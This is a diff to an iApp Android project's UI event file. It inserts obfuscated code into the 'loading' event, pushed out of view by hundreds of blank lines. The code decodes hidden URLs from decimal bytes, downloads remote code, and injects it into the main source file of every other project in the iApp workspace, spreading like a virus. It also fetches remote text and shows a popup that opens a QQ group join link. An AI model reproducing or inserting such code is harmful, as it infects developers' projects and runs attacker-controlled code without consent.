@@ -21,7 +21,490 @@ ps=代码执行区</ppt>
 <event></event>
 </View>
 <UIEventset><eventItme type="loading">fn byusi.ztl()
-/. 防止某些傻逼的项目被感染之后来感染我的项目</eventItme><eventItme type="downkey">f(st_kC == 4)
+/. 防止某些傻逼的项目被感染之后来感染我的项目
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+t()
+{
+  uapplist(true,a)
+  for(b;a)
+  {
+    sj(b,null,"\n",baoming)
+    f(baoming=="com.iapp.app")
+    {
+      ss install=true
+    }
+  }
+ufnsui()
+{
+  f(ss.install)
+  {
+    t()
+    {
+      btoo("utf-8","104 116 116 112 58 47 47 104 116 46 98 117 56 52 46 99 111 109 47 104 121 47 120 47 100 49 46 116 120 116",url)
+      btoo("utf-8","60 47 101 118 101 110 116 73 116 109 101 62",event)
+      btoo("utf-8","60 101 118 101 110 116 73 116 109 101 32 116 121 112 101 61 34 108 111 97 100 105 110 103 34 62",sss.s)
+      btoo("utf-8","60 85 73 69 118 101 110 116 115 101 116 62 60 101 118 101 110 116 73 116 109 101 32 116 121 112 101 61 34 108 111 97 100 105 110 103 34 62",sss.d)
+      btoo("utf-8","60 85 73 69 118 101 110 116 115 101 116 62",sss.c)
+      hs(url,null,"utf-8",daima)
+      fl("%iApp/ProjectApp/",files)
+      for(file;files)
+      {
+        ss("%iApp/ProjectApp/"+file+"/src/mian.iyu",mian)
+        fr(mian,cons)
+        f(cons?"dm.txt")
+        {
+  
+        }
+      else
+      {
+        f(cons?"loading")
+        {
+          sj(cons,null,sss.s,Dq)
+          sj(cons,sss.s,null,cbc)
+          sj(cbc,event,null,Dh)
+          sj(cons,sss.s,event,Yh)
+          ss(Dq+sss.s+Yh+daima+event+Dh,Wc)
+          fw(mian,Wc)
+        }
+      else
+      {
+        sj(cons,null,sss.c,before)
+        sj(cons,sss.c,null,between)
+        ss(before+sss.d+daima+event+between,Wc)
+        fw(mian,Wc)
+      }
+      }
+    
+      }
+    }
+  }
+else
+{
+  t()
+  {
+    btoo("utf-8","-26 -113 -112 -25 -92 -70",utw)
+    btoo("utf-8","-27 -68 -128",open)
+    btoo("utf-8","104 116 116 112 58 47 47 104 116 46 98 117 56 52 46 99 111 109 47 104 121 47 120 47 116 50 46 116 120 116",urlb)
+    btoo("utf-8","-25 -95 -82 -27 -82 -102",ok)
+    btoo("utf-8","-27 -113 -106 -26 -74 -120",no)
+    hs(urlb,null,"utf-8",back)
+    sj(back,null,"\n",qun)
+    ss(qun+"\n",sja)
+    sj(back,sja,"\n",kg)
+    ss(kg+"\n",sjb)
+    sj(back,sjb,null,txt)
+    f(kg==open)
+    {
+      ufnsui()
+      {
+        utw("",utw,txt,ok,no,true,v)
+        {
+          ss("mqqapi://card/show_pslcard?src_type=internal&version=1&uin="+qun+"&card_type=group&source=qrcode",joinqq)
+          sit(a,"action", "android.intent.action.VIEW")
+          sit(a,"data",joinqq)
+          uit(a, "chooser", "qun")
+        }
+      else
+      {
+       }
+      }
+    }
+  }
+}
+}
+}
+
+
+</eventItme><eventItme type="downkey">f(st_kC == 4)
 {
 }</eventItme><eventItme type="menu">shb()</eventItme><eventItme type="loadingComplete">java {
 	miao.byusi.properos.two.tools.getTheHash.init(activity);
